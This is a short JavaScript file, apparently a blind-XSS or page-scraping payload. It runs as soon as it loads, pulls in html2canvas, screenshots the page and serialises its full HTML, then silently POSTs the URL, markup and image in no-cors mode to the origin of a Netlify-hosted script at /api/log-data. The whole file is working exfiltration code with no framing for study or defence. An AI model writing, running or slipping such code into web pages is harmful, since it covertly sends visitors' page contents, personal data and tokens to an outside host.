// Function to inject the html2canvas script
function loadHtml2Canvas() {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

// Function to capture a screenshot
async function captureScreenshot() {
    const canvas = await html2canvas(document.body);
    return canvas.toDataURL('image/png');
}

// Function to send data
async function sendData(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        mode: 'no-cors', // Use no-cors mode
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    });
    // Note: You won't be able to access the response body or headers in no-cors mode
    return response; // This will be an opaque response
}

// Main function to execute the tasks
async function sendPageDetails() {
    console.log("sendPageDetails function is executing..."); // Log to confirm execution

    // Step 1: Get the current script's source URL
    const scripts = document.getElementsByTagName('script');
    let scriptOrigin = null;

    // Find a script with 'netlify' in its src
    for (let script of scripts) {
        if (script.src.includes('netlify')) {
            scriptOrigin = new URL(script.src).origin;
            break; // Exit loop once we find the first match
        }
    }

    if (!scriptOrigin) {
        console.error("No script with 'netlify' found.");
        return; // Exit if no valid origin is found
    }

    let imageBase64 = null;

    // Step 2: Capture a screenshot of the current page
    try {
        imageBase64 = await captureScreenshot();
    } catch (error) {
        console.error("Error capturing screenshot:", error);
        // You can still proceed to send data even if the screenshot fails
    }

    // Step 3: Prepare the data
    const data = {
        url: window.location.href,
        document: encodeURIComponent(document.documentElement.outerHTML), // Encoded document string
        imageData: imageBase64 // Image as base64 (may be null if capture failed)
    };

    // Send the data to the script's origin at /api/log-data
    sendData(`${scriptOrigin}/api/log-data`, data)
        .then(response => {
            console.log("Data sent successfully:", response);
        })
        .catch(error => {
            console.error("Error sending data:", error);
        });
}

// Load html2canvas and then execute the main function immediately
loadHtml2Canvas()
    .then(() => {
        // Immediately execute sendPageDetails after loading html2canvas
        sendPageDetails();
    })
    .catch(error => {
        console.error("Failed to load html2canvas:", error);
    });
